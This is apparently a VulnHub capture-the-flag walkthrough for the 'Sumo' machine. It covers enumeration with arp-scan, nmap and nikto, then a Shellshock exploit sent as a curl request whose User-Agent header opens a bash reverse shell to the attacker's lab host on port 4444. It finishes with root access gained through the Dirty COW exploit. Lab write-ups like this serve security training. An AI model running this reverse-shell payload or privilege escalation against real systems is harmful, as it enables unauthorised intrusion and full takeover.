# Sumo

### 1.Get VM IP

```bash
root@kali: arp-scan -I eth1 -l
Interface: eth1, type: EN10MB, MAC: 00:0c:29:3a:bc:b3, IPv4: 192.168.127.128
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.127.1	00:50:56:c0:00:01	VMware, Inc.
192.168.127.133	00:0c:29:6c:b0:85	VMware, Inc.
192.168.127.254	00:50:56:ea:34:a1	VMware, Inc.
```

The IP address is `192.168.127.133`, let's enumerate it.

### 2.Enumeration

```bash
root@kali: nmap -p- -sT -sV -sC -v -oN nmap.out 192.168.127.133
Nmap scan report for 192.168.127.133
Host is up (0.00033s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 5.9p1 Debian 5ubuntu1.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 06:cb:9e:a3:af:f0:10:48:c4:17:93:4a:2c:45:d9:48 (DSA)
|   2048 b7:c5:42:7b:ba:ae:9b:9b:71:90:e7:47:b4:a4:de:5a (RSA)
|_  256 fa:81:cd:00:2d:52:66:0b:70:fc:b8:40:fa:db:18:30 (ECDSA)
80/tcp open  http    Apache httpd 2.2.22 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.2.22 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
MAC Address: 00:0C:29:6C:B0:85 (VMware)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

try to scan port 80 with `nikto` :

```bash
root@kali: nikto -h 192.168.127.133
```

![image](https://github.com/Git-K3rnel/VulnHub/assets/127470407/b0b2b5ff-8ca4-4de2-8e60-05778cf42758)

site is vulnerable to shellshock, we can confirm it by nmap too :

```bash
nmap 192.168.127.133 -p 80 --script=http-shellshock --script-args uri=/cgi-bin/test
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-01 06:14 EDT
Nmap scan report for 192.168.127.133
Host is up (0.00039s latency).

PORT   STATE SERVICE
80/tcp open  http
| http-shellshock: 
|   VULNERABLE:
|   HTTP Shellshock vulnerability
|     State: VULNERABLE (Exploitable)
|     IDs:  CVE:CVE-2014-6271
|       This web application might be affected by the vulnerability known
|       as Shellshock. It seems the server is executing commands injected
|       via malicious HTTP headers.
|             
|     Disclosure date: 2014-09-24
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-7169
|       http://seclists.org/oss-sec/2014/q3/685
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6271
|_      http://www.openwall.com/lists/oss-security/2014/09/24/10
MAC Address: 00:0C:29:6C:B0:85 (VMware)
```

we just need to execute a reverse shell command to get the shell


### 3.Gaining Shell

Use the below command to get the shell :

```bash
curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/192.168.127.128/4444 0>&1' http://192.168.127.133/cgi-bin/test
```

```bash
www-data@ubuntu:/var/www$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

### 4.Privilege Escalation

Since this is an old machine, we can use dirtycow exploit :

```bash
www-data@ubuntu:/var/www$ uname -a
Linux ubuntu 3.2.0-23-generic #36-Ubuntu SMP Tue Apr 10 20:39:51 UTC 2012 x86_64 x86_64 x86_64 GNU/Linux

www-data@ubuntu:/var/www$ cat /etc/*-release
cat /etc/*-release
DISTRIB_ID=Ubuntu
DISTRIB_RELEASE=12.04
DISTRIB_CODENAME=precise
DISTRIB_DESCRIPTION="Ubuntu 12.04 LTS"
```

use `dirtycow.c` from [here](https://github.com/firefart/dirtycow/blob/master/dirty.c) :

```bash
www-data@ubuntu:/var/www$ /usr/bin/gcc -pthread dirty.c -o dirty -lcrypt
www-data@ubuntu: ./dirty
```

then you can login with user `firefart` and the password you provided when executing the exploit :

```bash
firefart@ubuntu:~# cat root.txt
{Sum0-SunCSR-2020_r001}
```

this is how you can get root on this machine :)












